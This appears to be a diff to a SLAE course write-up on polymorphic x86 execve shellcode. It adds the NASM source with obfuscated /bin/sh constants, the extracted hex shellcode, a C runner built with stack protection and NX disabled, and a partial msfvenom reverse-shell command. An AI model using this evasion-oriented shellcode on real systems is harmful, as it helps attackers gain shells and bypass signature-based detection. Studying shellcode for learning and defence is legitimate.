@@ -96,7 +96,7 @@ $
 
 ```
 
-The polymorphic version of the original shellcode is scripted in Assembly:
+The polymorphic (modified) version of the original shellcode is scripted in Assembly:
 
 ```nasm
 ; Filename: execve_poly.nasm
@@ -310,7 +310,128 @@ main()
 }
 ```
 
-asdfasdf
+The polymorphic (modified) version of the original shellcode is scripted in Assembly:
+
+```nasm
+; Filename: execve_poly.nasm
+; Author: h3ll0clar1c3
+; Purpose: Spawn a shell on the local host
+; Compilation: ./compile.sh execve_poly
+; Usage: ./execve_poly
+; Shellcode size: 37 bytes
+; Architecture: x86
+
+global   _start
+
+section .text
+        _start:
+
+        xor edx, edx                    ; initialize register // changed the register value
+        push edx                        ; push edx onto the stack // changed the register value
+        mov eax, 0x463ED8B7             ; move 0x463ED8B7 into eax // split to add up to original value /bin/sh
+        add eax, 0x22345678             ; move 0x22345678 into eax // split to add up to original value /bin/sh
+        push eax                        ; push eax onto the stack // added instruction
+        mov eax, 0xDEADC0DE             ; move 0xDEADC0DE into eax // split to add up to original value /bin/sh
+        sub eax, 0x70445EAF             ; move 0x70445EAF into eax // split to add up to original value /bin/sh
+        push eax                        ; push eax onto the stack // added instruction
+        push byte 0xb                   ; push 0xb onto the stack // changed the method
+        pop eax                         ; pop eax off the stack // added instruction
+        mov ecx, edx                    ; move edx into ecx // changed the register value
+        mov ebx, esp                    ; move esp into ebx // changed the order
+        push byte 0x1                   ; push 0x1 onto the stack // added instruction
+        pop esi                         ; pop esi off the stack // added instruction
+        int 0x80                        ; call the interrupt to execute the execve syscall, /bin/sh shell
+```
+
+The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
+#!/bin/bash
+
+echo '[+] Assembling with Nasm ... '
+nasm -f elf32 -o $1.o $1.nasm
+
+echo '[+] Linking ...'
+ld -o $1 $1.o
+
+echo '[+] Done!'
+```
+
+The Assembly code compiled as an executable binary:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh execve_poly
+[+] Assembling with Nasm ... 
+[+] Linking ...
+[+] Done!
+```
+
+The compiled binary is executed:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ ./execve_poly 
+$ id
+uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+$ 
+```
+
+Objdump is used to extract the shellcode from the Execve shell in hex format (Null free):
+
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./execve_poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
+"\x31\xd2\x52\xb8\xb7\xd8\x3e\x46\x05\x78\x56\x34\x22\x50\xb8\xde\xc0\xad\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80"
+```
+
+A C program scripted with the newly generated shellcode:
+
+```c 
+/**
+* Filename: execve_poly_shellcode.c
+* Author: h3ll0clar1c3
+* Purpose: Spawn a shell on the local host   
+* Compilation: gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final  
+* Usage: ./execve_poly_final
+* Shellcode size: 37 bytes
+* Architecture: x86
+**/
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\x31\xd2\x52\xb8\xb7\xd8\x3e\x46\x05\x78\x56\x34\x22\x50\xb8\xde\xc0\xad"
+"\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80";
+
+int main()
+{
+        printf("Shellcode length:  %d\n", strlen(code));
+        int (*ret)() = (int(*)())code;
+        ret();
+}
+```
+
+The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 37 bytes:
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final
+osboxes@osboxes:~/Downloads/SLAE/Assignment_6$ ./execve_poly_final 
+Shellcode length:  37
+$ id
+uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+$ 
+```
+
+The polymorphic version of the shellcode is 32% larger in size compared to the original reference from Shell-Storm.
+
+
+
+
+
+
+
+:-) We almost done !
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c
